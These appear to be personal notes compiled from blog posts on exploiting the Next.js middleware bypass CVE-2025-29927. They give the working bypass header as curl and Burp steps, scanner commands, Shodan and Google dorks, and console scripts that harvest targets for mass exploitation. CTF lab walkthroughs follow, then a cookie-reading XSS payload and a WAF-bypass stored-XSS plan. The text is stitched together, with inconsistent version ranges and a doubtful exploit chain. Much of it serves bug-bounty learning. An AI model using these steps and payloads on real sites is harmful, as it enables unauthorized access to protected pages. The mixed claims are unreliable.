## Exploit CVE-2025–29927 in Next.js

#Specific_CVE_Exploit

### Introduction

CVE-2025–29927 is a critical vulnerability found in Next.js, the open-source web framework by Vercel that powers React based applications. It allows attackers to bypass middleware authorization, gaining access to protected resources without proper authentication. This flaw poses serious security risks, including data exposure and application compromise. In this article we'll explore how the vulnerability works and how developers can secure their Next.js applications against it.

### Understanding Next.js and Middleware

#### What is Next.js?

Next.js is a React-based framework that simplifies web development by providing built-in features such as server side rendering (SSR) static site generation (SSG) and API route handling. Its key features include:

- Automatic Code Splitting: Faster page loads by only sending necessary JavaScript to the client.
- SSR and SSG: Improved SEO and performance.
- API Routes: Backend logic within the same application.
- Middleware Support: Custom logic execution before reaching the route handler.

### What is Middleware in Next.js?

Middleware in Next.js intercepts incoming HTTP requests and processes them before they reach the final route handler. It is commonly used for:

- Authentication & Authorization: Checking if a user is logged in before granting access to certain pages.
- Logging & Monitoring: Tracking requests for analytics or debugging.
- Request Modification: Altering headers or query parameters before processing.

### Understanding CVE-2025–29927

CVE-2025–29927 exploits an issue in Next.js middleware that allows attackers to bypass authentication and authorization checks. This occurs due to improper validation in request handling, allowing unauthorized users to gain access to protected resources.

#### Technical Explanation

The root cause of this vulnerability lies in middleware failing to enforce strict authentication checks. For example consider the following middleware function:

```js
export function middleware(req) {   
if (!req.cookies.token) {   
return new Response('Unauthorized', { status: 401 });   }  
return NextResponse.next(); }
```

In this setup if an attacker can manipulate the req.cookies.token value-perhaps through session fixation, 

**cookie injection or header tampering they may be able to bypass authentication entirely.**

### Steps to Exploit CVE-2025–29927

While its important to focus on fixing the issue, understanding how the vulnerability is exploited can help with mitigation strategies.

#### **Step 1: Identifying the Vulnerable Middleware**

Let's say you're testing target.com and you suspect it's running a vulnerable version of Next.js. The first step is to confirm whether the site is actually using Next.js.

You can do this by checking the framework version using tools like the Wappalyzer browser extension.

![None](https://miro.medium.com/v2/resize:fit:700/1*aqkSzz4Eje9Mytn0A7UBZA.png)

extension will display the web framework as Next.js along with its version.

Once you have the version compare it against the affected versions **list for CVE-2025–29927 to determine if the site is vulnerable.**

In some cases Wappalyzer might not display the Next.js version. When that happens you can try accessing endpoints

like: 
> /_next/static/chunks/ or /_next/static/manifest.json to look for version leaks.

heck the response headers for X-Powered-By: Next.js using browser developer tools or tools like Burp Suite.

You can also use the default **Nuclei template for the Next.js** CVE provided by the ProjectDiscovery team to automate the detection.


```bash
echo target.com | nuclei -t nuclei-templates/http/cves/2025/CVE-2025-29927.yaml 

subfinder -d target.com -all | nuclei -t nuclei-templates/http/cves/2025/CVE-2025-29927.yaml
```

This Nuclei template will display all the affected Next.js versions as shown in the screenshot below:

![None](https://miro.medium.com/v2/resize:fit:700/1*gWvbH49-X3VrubTXIZUsOw.jpeg)

#### **Step 2: Exploiting** the Vulnerable Middleware

Once a vulnerable middleware is identified attackers can manipulate HTTP requests to bypass authorization checks.

Start by locating a protected endpoint such as the admin dashboard. **Then use the following simple curl command to inspect the response headers.** 

```bash
curl -v https://target.com/dashboard
```

If it returns a 307 redirect to the login page, it indicates that authorization is required to access that endpoint:

![[Pasted image 20250409074022.png]]
					example req.

To exploit the vulnerability you can use the following simple curl command. 

It bypasses the authentication and grants access to the dashboard page:

```bash
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" https://target.com/dashboard
```

![[Pasted image 20250409104952.png]]


![[Pasted image 20250409105156.png]]
#### Using Burp Suite

To exploit the vulnerability using Burp Suite, send a request to the protected endpoint in Repeater then add the following header to bypass the middleware and gain access to the dashboard page:

```bash
x-middleware-subrequest: middleware:middleware:middleware:middleware
```

### Mass Hunting using Shodan

For mass hunting the Next.js vulnerability you can follow the approach I use.

Start by going to Shodan and searching for the header x-middleware-rewrite. 

<mark style="background: #FF5582A6;">This will return around 15,440 results with that header present in the response an indicator of middleware usage as shown in the screenshot below:</mark>

![None](https://miro.medium.com/v2/resize:fit:700/1*JkE8KuAn3gi2PFfg2_4uvQ.png)

Next, left click on the "More" option under Facet Analysis, then select the "Domain" filter just like shown in the screenshot:

> x-middleware-rewrite

![None](https://miro.medium.com/v2/resize:fit:700/1*XoGSrIF0mI46zzqBRe5yQg.png)

![None](https://miro.medium.com/v2/resize:fit:700/1*LVYe7H5UUS-ebXRFQuJQtQ.png)

After selecting the Domain filter you'll see a list of all domains matching your search query. 

Now open Developer Tools by pressing F12, go to the Console tab paste the following code and hit Enter:

```javascript
var ipElements=document.querySelectorAll('strong'),ips=[],domains=[];ipElements.forEach(function(e){var t=e.innerHTML.replace(/['"]/g,'').trim();/^(\d{1,3}\.){3}\d{1,3}$/.test(t)?ips.push(t):/^(?!\d+\.)[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(t)&&domains.push(t)});var dataString='IPs:\n'+ips.join('\n')+'\n\nDomains:\n'+domains.join('\n'),a=document.createElement('a');a.href='data:text/plain;charset=utf-8,'+encodeURIComponent(dataString);a.download='domains.txt';document.body.appendChild(a);a.click();
```

![None](https://miro.medium.com/v2/resize:fit:700/1*LZV8SAvk1zAo2nx0-cFgVQ.png)

After entering the code and pressing Enter you'll get an option to save the extracted domains. Go ahead and save the file you now have all the domains from the current query. You can follow the same process to extract IP addresses as well. Just enter the code below and it will list all the IPs associated with the search results:

```js
var ipElements=document.querySelectorAll('strong');var ips=[];ipElements.forEach(function(e){ips.push(e.innerHTML.replace(/["']/g,''))});var ipsString=ips.join('\n');var a=document.createElement('a');a.href='data:text/plain;charset=utf-8,'+encodeURIComponent(ipsString);a.download='ip.txt';document.body.appendChild(a);a.click();
```

Now you have two files one containing <mark style="background: #ADCCFFA6;">all the IPs and another with domain names</mark>

Simply clean or sort the domain list using tools like uro or manually with a text editor like Notepad. Once sorted you're all set to run the Nuclei template on these targets to begin scanning for the vulnerability:

```bash
cat ip.txt | uro | nuclei -t nuclei-templates/http/cves/2025/CVE-2025-29927.yaml 

cat domains.txt | uro | nuclei -t nuclei-templates/http/cves/2025/CVE-2025-29927.yaml
```

You'll now have a list of potentially vulnerable targets. From here you can verify each one manually or use an automation tool to confirm the vulnerability across all targets.

![None](https://miro.medium.com/v2/resize:fit:700/1*bexJL_YR03BP2m19UIEeZQ.jpeg)

You can download all the templates from **coffinxp GitHub repository**. I've included three templates including one for cache poisoning via X-Middleware-Prefetch:

![[Pasted image 20250409105249.png]]

> https://github.com/coffinxp/nuclei-templates/blob/main/CVE-2025-29927.yaml

> https://github.com/coffinxp/nuclei-templates/blob/main/next-js.yaml

> https://github.com/coffinxp/nuclei-templates/blob/main/nextjs-middleware-cache.yaml

### Dorks

You can also try using these dorks either manually or through automation to discover more potential targets:

```bash
shodan-query: 
	- shodan-query: x-middleware-rewrite
	- http.html:"/_next/static"
	- cpe:"cpe:2.3:a:zeit:next.js" 
fofa-query: 
	- body="/_next/static"
	- "x-middleware-rewrite" 
google-dork: 
	- inurl:"/_next" AND intext:"next.config.js" OR intext:"Powered by Next.js"
```

![[Pasted image 20250409083630.png]]

### Impact of CVE-2025–29927

- Unauthorized Data Access: Attackers could view or modify private user information.
- Privilege Escalation: Unauthorized users may gain administrative access.
- Application Takeover: In severe cases attackers could compromise the entire application.

#### Affected Versions

Any Next.js application using outdated or misconfigured middleware may be vulnerable. Developers should refer to the official security advisory to review the affected versions and apply the recommended patches.

- Next.js 15.x: Upgrade to 15.2.3 or later.
- Next.js 14.x: Upgrade to 14.2.25 or later.
- Next.js 13.x: Upgrade to 13.5.9 or later.
- Next.js 12.x: Upgrade to 12.3.5 or later.

![[Pasted image 20250409104048.png]]

**All versions of Next.js from 11.1.4 through 13.5.6, 14.x before 14.2.25,**
 **and 15.x before 15.2.3 are affected by this vulnerability.** 
 
 The impact:
is particularly significant for applications that rely on middleware for
 implementing access controls, as attackers can gain unauthorized access
 to protected resources without authentication.


THM simple lab:

> https://tryhackme.com/room/nextjscve202529927

![[Pasted image 20250413163338.png]]


Another example:

**Lab 1:**

So here is our first Web Application.

![](https://miro.medium.com/v2/resize:fit:875/1*Ek6o_yj9UH18a8f-9XrBXQ.jpeg)

This is the Page I have to bypass. The request is like in Burp.

![](https://miro.medium.com/v2/resize:fit:875/1*pX69U-2HLJzKYLKDgy14Hw.jpeg)

After inspecting the Next JS version I noticed it is actually a Vulnerable. (**_12.2.5_**)

![](https://miro.medium.com/v2/resize:fit:875/1*VmDO3Q8dg0wfY-1E8GtEqA.jpeg)

Now I will use this Header`**_x-middleware-subrequest: middleware_**`

This will bypass the Login Page. Previously I got 307 Redirect but now it is 200 OK. This means Authentication Bypassed. (We don’t even need to log in😈)

![](https://miro.medium.com/v2/resize:fit:875/1*7i3hvcu2o1bOYuqCDj-fKg.png)

![](https://miro.medium.com/v2/resize:fit:875/1*Rq3WRPnWsYpNN7j4A_aSbQ.jpeg)

After exploring the Page through Burp I saw there is a **_/events_** page.

![](https://miro.medium.com/v2/resize:fit:875/1*nZC4mNz2zgJnR8vUL-adLQ.png)

And the page disclosed the Content and the 1st Flag.

![](https://miro.medium.com/v2/resize:fit:875/1*H-Jjk2_KMpBpbyKjZqyWjg.png)


**Lab 2:**

In the next Lab I got different Subdomain : **_subdomain.kappa.ctfio.com_**. This Page seems same like before. Simple Login Page.

![](https://miro.medium.com/v2/resize:fit:875/1*cKy8R0FTyBddqzC4Rijpgg.jpeg)

Here after replicating the previous steps I got this. (`**_x-middleware-subrequest: middleware_**`)

![](https://miro.medium.com/v2/resize:fit:875/1*uzQ36uihXH_2X9Wpz3TNyA.jpeg)

But after visiting the **_/events_** Page I got nothing. (Though I can exploit the Vulnerability but the main goal is here to find the Flag.)

![](https://miro.medium.com/v2/resize:fit:875/1*IJLZB95j7v6sEUDEpykZzA.jpeg)

Time to Recon💥. After inspecting the JS Files I got some interesting Endpoints. Here I got **_/events/create_** which was not showing previously.

![](https://miro.medium.com/v2/resize:fit:875/1*5vs0K-fU4lF26NoCrL1g5Q.png)

After requesting the Page I got a valid Response. And the Flag2 also.

![](https://miro.medium.com/v2/resize:fit:875/1*JoSWE2-QDK4jqOV2FHlD_g.png)

![](https://miro.medium.com/v2/resize:fit:875/1*WSeiiiDvfWNxw8uUJdPZaQ.png)

If you wanna try it out check it here.

---

while you're hunting for this cve, after doing subdomain recon, **you could use nuclei template for cve-2025-29927** and try to look for this [highlited] header inside the login response:

![[Pasted image 20250417183449.png]]

You can filter them out with **httpx** and automate the screenshoots:

![[Pasted image 20250417184322.png]]

![[Pasted image 20250417184241.png]]

---

Next.js Middleware Auth Bypass (CVE-2025-29927) and Local File Read via XXE - HackDonalds Challenge

https://www.youtube.com/watch?v=KwD_TKZr0YY


---

## Real World Exploit Example


I noticed something subtle yet powerful:  
**The 307 Redirect only appeared when** `**X-Nextjs-Data: 1**` **was in the request.**

That was my golden clue.

So I went full Sherlock Holmes on my **private programs**. First, I downloaded every scope from my bug bounty targets. Then, I used **httpx** to filter the live ones:

httpx -td -sc -d "X-Nextjs-Data: 1"

- `-td` → Detect underlying technologies
- `-sc` → Fetch HTTP status codes
- `-d` → Inject headers

## Tracing Vulnerable Versions

Then it hit me. While re-reading the PoC, I noticed a critical detail:

> **_The vulnerability only affects Next.js versions between 11.1.4 and 14.2.2._**

The problem? `httpx` couldn’t detect exact versions, and manually checking each one? No way. I may be a hacker, but I’m also lazy. 😏

Enter **Webanalyze** — a tool I stumbled upon on GitHub. I ran it, filtered the results with `grep`, and _voilà_ — **12 potential targets**.

![](https://miro.medium.com/v2/resize:fit:430/1*oSXcAVgmKvZ1kyHDG_nrTQ.png)

--- project discovery already made a nuclei template about this cve


---

![[Pasted image 20250422120039.png]]
```html
<style>@keyframes x{}<style><mark style="animation-name:x"onanimationend=alert(document.cookie)></mark>
```


**NEXT TO DO:** 

🚨 Next.js + WAF Bypass + SXSS via Cookie Reordering 🚨

🧠 Attack Summary:
You’re dealing with:

🔍 A Next.js app

⚠️ Two reflected cookies in pageProps
⚠️ A WAF blocking your initial attempts

🧪 Observations:
🧨 Single payload → 403 Forbidden

🧨 Split payload across two cookies → Still 403

🧨 Reorder the cookie fragments → 200 OK ✅

👀 That’s your in! Reversing the order bypasses the WAF inspection logic 🔄

⚠️ Now chain it with:

🧫 CVE-2024-46982 (Elixir Stale SSR template injection)
🔗 https://github.com/masch1/CVE-2024-46982

➡️ This allows CP (Client-side Prototype Pollution) → Stored XSS (SXSS) in Next.js apps.

💣 Exploit Flow:
    💎 Bypass WAF via cookie reordering
    💎 Inject CP payload using stale Elixir template vuln
    💎 Achieve SXSS across all visiting users!

🛡 Mitigation Tips:
    ✅ Sanitize cookie inputs server-side
    ✅ Audit template engines for unsafe parsing
    ✅ Patch Elixir if in stack (see CVE-2024-46982)



----


https://medium.com/@Nightbloodz/grafana-cve-2025-4123-full-read-ssrf-account-takeover-d12abd13cd53

https://medium.com/@canonminibeast/puny-code-0-click-account-takeover-6345ec46a33b?source=home_for_you---------1-98--------------------371b50ac_bb30_4cd9_b1d2_e89046a71b8c-------15-------

---

https://medium.verylazytech.com/poc-remote-and-unauthenticated-attacker-can-send-crafted-http-requests-to-execute-arbitrary-code-4b591d45ff4f?sk=8cbe8392180434ca5df84a7ef1df2b56